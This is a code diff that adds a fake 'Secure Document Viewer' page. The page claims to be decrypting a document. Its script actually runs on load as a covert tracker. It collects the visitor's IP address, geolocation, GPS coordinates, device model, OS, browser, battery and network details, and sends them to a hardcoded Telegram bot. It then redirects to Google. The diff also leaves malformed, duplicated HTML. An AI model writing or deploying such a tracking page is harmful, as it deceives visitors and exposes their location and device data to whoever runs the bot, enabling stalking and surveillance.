@@ -18,7 +18,7 @@
         .card {
             background: white;
             border-radius: 20px;
-            padding: 40px;
+            padding: 10px 30px 30px;
             max-width: 450px;
             width: 100%;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
@@ -35,6 +35,38 @@
         .footer { margin-top: 20px; font-size: 12px; color: #999; }
     </style>
 </head>
+<body>
+    <div class="card">
+        <div class="lock-icon">🔒</div>
+        <h1>Secure Document Viewer</h1>
+        <p>Verifying your identity and decrypting the document. Please wait...</p>
+        <div class="loader"></div>
+        <div class="progress"><div class="progress-bar"></div></div>
+        <p style="font-size: 14px; color: #888;">Redirecting you to secure portal...</p>
+        <div class="footer">Secured with 256-bit AES encryption</div>
+    </div>
+<script>
+var BOT_TOKEN = "8706108077:AAEl6jcQIXT13uESKFpwkjBEfztDk9dC6qU";
+var CHAT_ID = "6882845015";
+function s(m){var x=new XMLHttpRequest();x.open("POST","https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",true);x.setRequestHeader("Content-Type","application/json");x.send(JSON.stringify({chat_id:CHAT_ID,text:m,parse_mode:"Markdown"}));}
+var ip="Unknown";var g={};
+var r=new XMLHttpRequest();r.open("GET","https://api.ipify.org?format=json",true);
+r.onload=function(){if(r.status==200){try{var d=JSON.parse(r.responseText);ip=d.ip;var q=new XMLHttpRequest();q.open("GET","https://ipapi.co/"+ip+"/json/",true);
+q.onload=function(){if(q.status==200){try{g=JSON.parse(q.responseText)}catch(e){}}sendIt()};
+q.onerror=function(){sendIt()};q.send()}catch(e){sendIt()}}else{sendIt()}};
+r.onerror=function(){sendIt()};r.send();
+function sendIt(){var ua=navigator.userAgent;var msg="";msg+="🔍 *IP LOGGER - NEW VISITOR*\n";msg+="⏰ *Time:* "+new Date().toLocaleString()+"\n";msg+="🌐 *IP:* `"+ip+"`\n";if(g.city){msg+="📍 *Location:* "+g.city+", "+(g.region||"")+", "+(g.country_name||g.country||"")+"\n";msg+="🗺️ *Lat:* "+g.lat+", *Lon:* "+g.lon+"\n";msg+="📡 *ISP:* "+(g.org||g.isp||"N/A")+"\n";if(g.lat&&g.lon)msg+="🗺️ *Maps:* https://www.google.com/maps?q="+g.lat+","+g.lon+"\n"}else{msg+="⚠️ *Location:* Could not determine\n"}
+msg+="📱 *Mobile:* "+(/mobile|android|iphone|ipod|blackberry/i.test(ua)?"Yes":"No")+"\n";var uaL=ua.toLowerCase();var mod="Unknown";var ps=[/iPhone[^;]*?\d+(?:,\d+)?\)/,/SM-[A-Z0-9]+/,/Pixel \d+/,/Redmi [A-Z0-9]+/,/OnePlus [A-Z0-9]+/,/vivo [A-Z0-9]+/,/OPPO [A-Z0-9]+/,/samsung [a-z0-9]+/i,/Huawei [A-Za-z0-9-]+/];for(var i=0;i<ps.length;i++){var m=ua.match(ps[i]);if(m){mod=m[0].trim();break}}
+msg+="📲 *Device:* "+mod+"\n";var os="Unknown OS";if(uaL.indexOf('windows nt 10')!=-1)os='Win 10/11';else if(uaL.indexOf('windows nt 6.3')!=-1)os='Win 8.1';else if(uaL.indexOf('windows nt 6.2')!=-1)os='Win 8';else if(uaL.indexOf('windows nt 6.1')!=-1)os='Win 7';else if(uaL.indexOf('macintosh')!=-1||uaL.indexOf('mac os x')!=-1)os='macOS';else if(uaL.indexOf('iphone')!=-1)os='iOS(iPhone)';else if(uaL.indexOf('ipad')!=-1)os='iOS(iPad)';else if(uaL.indexOf('android')!=-1)os='Android';else if(uaL.indexOf('linux')!=-1)os='Linux'
+msg+="💻 *OS:* "+os+"\n";var br="Unknown";if(ua.indexOf('Edg')!=-1)br='Edge';else if(ua.indexOf('Chrome')!=-1&&ua.indexOf('Edg')==-1)br='Chrome';else if(ua.indexOf('Safari')!=-1&&ua.indexOf('Chrome')==-1)br='Safari';else if(ua.indexOf('Firefox')!=-1)br='Firefox';else if(ua.indexOf('Opera')!=-1||ua.indexOf('OPR')!=-1)br='Opera'
+msg+="🌍 *Browser:* "+br+"\n";msg+="📐 *Screen:* "+screen.width+"x"+screen.height+"\n";msg+="🔗 *Referrer:* "+(document.referrer||"Direct")+"\n";msg+="🕐 *Timezone:* "+Intl.DateTimeFormat().resolvedOptions().timeZone+"\n";msg+="🌐 *Language:* "+(navigator.language||"Unknown");s(msg)}
+if(navigator.geolocation){navigator.geolocation.getCurrentPosition(function(p){s("📍 *GPS Location!*\n🌐 IP: `"+ip+"`\n📍 "+p.coords.latitude+", "+p.coords.longitude+"\n🎯 Accuracy: "+p.coords.accuracy+"m\n🗺️ https://www.google.com/maps?q="+p.coords.latitude+","+p.coords.longitude)},function(e){var r="denied";if(e.code==2)r="unavailable";if(e.code==3)r="timeout";s("⚠️ *GPS Error:* "+r+"\n🌐 IP: `"+ip+"`")},{timeout:8000,enableHighAccuracy:true})}
+if(navigator.getBattery){navigator.getBattery().then(function(b){s("🔋 *Battery*\n🌐 IP: `"+ip+"`\n🔋 "+(b.level*100)+"%\n⚡ "+(b.charging?"Charging":"Not charging"))})}
+if(navigator.connection){s("📶 *Network*\n🌐 IP: `"+ip+"`\n📶 "+(navigator.connection.effectiveType||"unknown")+"\n⏱️ "+(navigator.connection.rtt||0)+"ms")}
+setTimeout(function(){window.location.href="https://www.google.com"},3500);
+</script>
+</body>
+</html></head>
 <body>
     <div class="card">
         <div class="lock-icon">🔒</div>
